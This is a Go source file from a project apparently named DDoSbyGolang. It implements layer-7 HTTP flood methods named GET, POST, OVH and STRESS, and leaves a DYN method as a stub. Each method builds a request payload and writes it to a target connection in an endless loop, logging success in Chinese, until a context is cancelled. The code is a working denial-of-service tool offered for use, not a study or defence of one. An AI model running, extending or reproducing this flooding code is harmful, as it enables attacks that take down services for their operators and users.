/*
 * @Author: uyplayer
 * @Date: 2022/3/27 02:54
 * @Email: uyplayer@qq.com
 * @File: script.go
 * @Software: GoLand
 * @Dir: DDoSbyGolang / layer7
 * @Project_Name: DDoSbyGolang
 * @Description:
 */

package layer7

import (
	"DDoSbyGolang/common"
	"encoding/json"
	"fmt"
	"math/rand"
	"time"
)

//
//  GET
//  @Description: GET 请求
//  @receiver L
//  @param work
//
func (L Layer7) GET(work Work) {

	// 捕获panic
	defer work.PanRec()
	// 获取payload
	// payload
	payload := generatePayload("", work)
	_, err := work.Con.Write([]byte(payload))
	if err != nil {
		common.Warning.Println("  请求失败  ")
	} else {
		common.Warning.Println("  请求成功  ")

		for {
			select {
			case <-work.Context.Done():
				common.Error.Println(work.Context.Err())
				return
			default:
				_, err = work.Con.Write([]byte(payload))
				if err == nil {
					common.Warning.Println("  请求成功  ")
					fmt.Println(" 正在发送 payload")
					work.Payload <- payload
				}

			}
		}
	}

}

//
//  POST
//  @Description: POST
//  @receiver L
//
func (L Layer7) POST(work Work) {
	//使用 defer + recover 防止整个程序崩塌
	defer work.PanRec()
	// 数据
	data := map[string]string{
		"test": string(1 << 100),
	}
	// 转换json
	stu, err := json.Marshal(&data)
	if err != nil {
		common.Error.Println(" Get : ", err)
	}
	pyl := fmt.Sprintf("Content-Length: 44\r\n"+
		"X-Requested-With: XMLHttpRequest\r\n"+
		"Content-Type: application/json\r\n\r\n data: %s", stu)
	// payload
	payload := generatePayload(pyl, work)
	_, err = work.Con.Write([]byte(payload))
	if err != nil {
		common.Warning.Println("  请求失败  ")
	} else {
		common.Warning.Println("  请求成功  ")

		for {
			select {
			case <-work.Context.Done():
				common.Error.Println(work.Context.Err())
				return
			default:
				_, err = work.Con.Write([]byte(payload))
				if err == nil {
					common.Warning.Println("  请求成功  ")
					fmt.Println(" 正在发送 payload")
					work.Payload <- payload
				}

			}
		}
	}
}

//
//  OVH
//  @Description: OVH
//  @receiver L
//  @param work
//
func (L Layer7) OVH(work Work) {
	// 捕获panic
	defer work.PanRec()
	// 获取payload
	// payload
	payload := generatePayload("", work)
	_, err := work.Con.Write([]byte(payload))
	if err != nil {
		common.Warning.Println("  请求失败  ")
	} else {
		common.Warning.Println("  请求成功  ")

		for {
			select {
			case <-work.Context.Done():
				common.Error.Println(work.Context.Err())
				return
			default:
				_, err = work.Con.Write([]byte(payload))
				if err == nil {
					common.Warning.Println("  请求成功  ")
					fmt.Println(" 正在发送 payload")
					work.Payload <- payload
				}

			}
		}
	}

}

//
//  STRESS
//  @Description: Send HTTP Packet With High Byte
//  @receiver L
//  @param work
//
func (L Layer7) STRESS(work Work) {

	// 捕获panic
	defer work.PanRec()
	// 获取payload
	rand.Seed(time.Now().UnixNano())
	data := generateBytes(524)[:10]
	pyl := fmt.Sprintf("Content-Length: 524\r\n"+
		"X-Requested-With: XMLHttpRequest\r\n"+
		"Content-Type: application/json\r\n\r\n data: %s", string(data))

	// payload
	payload := generatePayload(pyl, work)
	_, err := work.Con.Write([]byte(payload))
	if err != nil {
		common.Warning.Println("  请求失败  ")
	} else {
		common.Warning.Println("  请求成功  ")

		for {
			select {
			case <-work.Context.Done():
				common.Error.Println(work.Context.Err())
				return
			default:
				_, err = work.Con.Write([]byte(payload))
				if err == nil {
					common.Warning.Println("  请求成功  ")
					fmt.Println(" 正在发送 payload")
					work.Payload <- payload
				}

			}
		}
	}

}

//
//  DYN
//  @Description: DYN
//  @receiver L
//  @param work
//
func (L Layer7) DYN(work Work) {
	// 捕获panic
	defer work.PanRec()
	// 获取payload
	rand.Seed(time.Now().UnixNano())

}
